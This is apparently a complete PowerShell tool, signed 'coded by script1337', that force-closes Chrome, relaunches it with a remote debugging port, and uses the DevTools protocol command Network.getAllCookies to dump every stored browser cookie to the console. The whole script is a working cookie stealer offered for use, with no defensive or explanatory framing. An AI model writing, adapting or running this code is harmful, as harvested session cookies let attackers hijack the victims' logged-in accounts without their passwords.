 Write-Host "  ZZZZ    EEEEE   RRRR     OOO  "
Write-Host "     Z    E       R   R   O   O "
Write-Host "    Z     EEEE    RRRR    O   O "
Write-Host "   Z      E       R R     O   O "
Write-Host "  ZZZZ    EEEEE   R  RR    OOO  coded by script1337"
Write-Host " Github : https://github.com/ScRiPt1337"
Write-Host ""




$remoteDebuggingPort = 9222
$URL = "https://google.com"

function quitx(){
    if (Get-Process -Name "chrome" -ErrorAction SilentlyContinue) {
        Stop-Process -Name "chrome" -Force
    }
}

function SendReceiveWebSocketMessage {
    param (
        [string] $WebSocketUrl,
        [string] $Message
    )

    try {
        $WebSocket = [System.Net.WebSockets.ClientWebSocket]::new()
        $CancellationToken = [System.Threading.CancellationToken]::None
        $connectTask = $WebSocket.ConnectAsync([System.Uri] $WebSocketUrl, $CancellationToken)
        [void]$connectTask.Result
        if ($WebSocket.State -ne [System.Net.WebSockets.WebSocketState]::Open) {
            throw "WebSocket connection failed. State: $($WebSocket.State)"
        }
        $messageBytes = [System.Text.Encoding]::UTF8.GetBytes($Message)
        $buffer = [System.ArraySegment[byte]]::new($messageBytes)
        $sendTask = $WebSocket.SendAsync($buffer, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $CancellationToken)
        [void]$sendTask.Result
        $receivedData = New-Object System.Collections.Generic.List[byte]
        $ReceiveBuffer = New-Object byte[] 4096 # Adjust the buffer size as needed
        $ReceiveBufferSegment = [System.ArraySegment[byte]]::new($ReceiveBuffer)

        while ($true) {
            $receiveResult = $WebSocket.ReceiveAsync($ReceiveBufferSegment, $CancellationToken)
            if ($receiveResult.Result.Count -gt 0) {
                $receivedData.AddRange([byte[]]($ReceiveBufferSegment.Array)[0..($receiveResult.Result.Count - 1)])
            }
            if ($receiveResult.Result.EndOfMessage) {
                break
            }
        }
        $ReceivedMessage = [System.Text.Encoding]::UTF8.GetString($receivedData.ToArray())
        $WebSocket.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "WebSocket closed", $CancellationToken)
        return $ReceivedMessage
    } catch {
        throw $_
    }
}
quitx
#$username = $env:USERNAME
$chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
$process = Start-Process -FilePath $chromePath -ArgumentList $URL  , "--remote-debugging-port=$remoteDebuggingPort", "--remote-allow-origins=ws://localhost:$remoteDebuggingPort"
$jsonUrl = "http://localhost:$remoteDebuggingPort/json"
$jsonData = Invoke-RestMethod -Uri $jsonUrl -Method Get
$url_capture = $jsonData.webSocketDebuggerUrl
$Message = '{"id": 1,"method":"Network.getAllCookies"}'
if ($url_capture[0].Length -ge 2) {
    $response = SendReceiveWebSocketMessage -WebSocketUrl $url_capture[0] -Message $Message
    Write-Host $response
} else {
    $response = SendReceiveWebSocketMessage -WebSocketUrl $url_capture -Message $Message
    Write-Host $response
}
quitx  
